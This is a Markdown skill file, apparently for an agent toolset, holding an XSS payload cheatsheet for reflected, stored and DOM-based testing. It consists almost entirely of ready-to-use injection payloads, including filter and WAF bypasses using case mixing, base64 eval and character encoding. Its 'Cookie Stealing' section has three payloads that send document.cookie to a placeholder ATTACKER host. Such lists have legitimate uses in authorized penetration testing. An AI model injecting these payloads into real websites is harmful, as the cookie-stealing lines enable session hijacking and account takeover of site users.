---
name: cheatsheet-xss
description: XSS (Cross-Site Scripting) payloads for reflected, stored, and DOM-based testing
---

# XSS Payload Cheatsheet

## Basic Payloads
```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

## Filter Bypass
```html
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<img src=x onerror=alert`XSS`>
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

## Event Handler Payloads
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe onload=alert(1)>
<object onerror=alert(1)>
```

## Cookie Stealing
```html
<script>new Image().src="http://ATTACKER/steal?c="+document.cookie</script>
<script>fetch("http://ATTACKER/steal?c="+document.cookie)</script>
<img src=x onerror="this.src='http://ATTACKER/steal?c='+document.cookie">
```

## WAF Bypass Techniques
```html
<img src=x onerror=alert(1)>
<img src=x onerror=\u0061lert(1)>
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=&#x61;lert(1)>
```

## DOM-Based XSS
```javascript
// Check these sinks:
document.write()
document.writeln()
element.innerHTML
element.outerHTML
eval()
setTimeout()
setInterval()
```

## Automated Testing
Use XSStrike or similar tools for automated XSS discovery.
